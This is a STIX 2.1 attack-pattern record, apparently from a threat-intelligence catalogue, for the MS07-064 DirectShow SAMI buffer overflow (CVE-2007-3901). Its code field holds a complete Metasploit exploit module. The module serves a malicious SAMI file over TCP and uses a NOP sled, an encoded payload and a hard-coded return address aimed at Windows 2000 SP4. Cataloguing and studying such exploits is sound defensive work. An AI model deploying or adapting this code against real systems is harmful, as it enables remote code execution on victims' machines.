{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f46127e8-da9c-48a3-8025-2145dac1635e",
    "created": "2024-08-14T16:46:15.047033Z",
    "modified": "2024-08-14T16:46:15.047037Z",
    "name": "MS07-064 Microsoft DirectX DirectShow SAMI Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the DirectShow Synchronized Accessible Media Interchanged (SAMI) parser in quartz.dll. This module has only been tested with Windows Media Player (6.4.09.1129) and DirectX 8.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ms07_064_sami.rb",
            "external_id": "ms07_064_sami.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3901"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS07-064 Microsoft DirectX DirectShow SAMI Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the DirectShow Synchronized\n        Accessible Media Interchanged (SAMI) parser in quartz.dll. This module\n        has only been tested with Windows Media Player (6.4.09.1129) and\n        DirectX 8.0.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-3901' ],\n          [ 'OSVDB', '39126' ],\n          [ 'MSB', 'MS07-064' ],\n          [ 'BID', '26789' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 600,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x22\\x25\\x26\\x27\\x2b\\x2f\\x3a\\x3c\\x3e\\x3f\\x40\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 Pro SP4 English', { 'Offset' => 22412, 'Ret' => 0x75022ac4 } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2007-12-11',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_client_connect(client)\n    return if ((p = regenerate_payload(client)) == nil)\n\n    client.get_once\n\n    buffer =  make_nops(target['Offset'] - payload.encoded.length) + payload.encoded\n    buffer << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V')\n    buffer << make_nops(10) + [0xe8, -485].pack('CV') + rand_text_english(132324)\n\n    header =  \"HTTP/1.1 200 OK\\r\\n\"\n    header << \"Content-Type: application/smil\\r\\n\\r\\n\"\n\n    body =  \"<SAMI>\\r<HEAD>\\r<STYLE TYPE=\\\"text/css\\\">\\r\"\n    body << \"<!--\\rP {font-size: 1em;\\rfont-family: Arial;\\r\"\n    body << \"font-weight: normal;\\rcolor: #FFFFFF;\\r\"\n    body << \"background: #FFFFFF;\\rtext-align: center;\\r\"\n    body << \"padding-left: 2px;\\rpadding-right: 2px;\\r\"\n    body << \"padding-bottom: 2px;\\r}\\r.ENUSCC { Name: English; lang: EN-US-CC; }\\r\"\n    body << \"-->\\r</STYLE>\\r</HEAD>\\r<BODY>\\r\"\n    body << \"<SYNC Start=\\\"0\\\" pippo=\\\"\" + buffer\n    body << \"\\\"><P Class=\\\"ENUSCC\\\"></P></SYNC></BODY></SAMI>\"\n\n    sploit = header + body\n\n    print_status(\"Sending #{sploit.length} bytes to #{client.peerhost}:#{client.peerport}...\")\n\n    client.put(sploit)\n    handler(client)\n\n    service.close_client(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-12-11",
    "x_mitre_platforms": [
        "win'"
    ]
}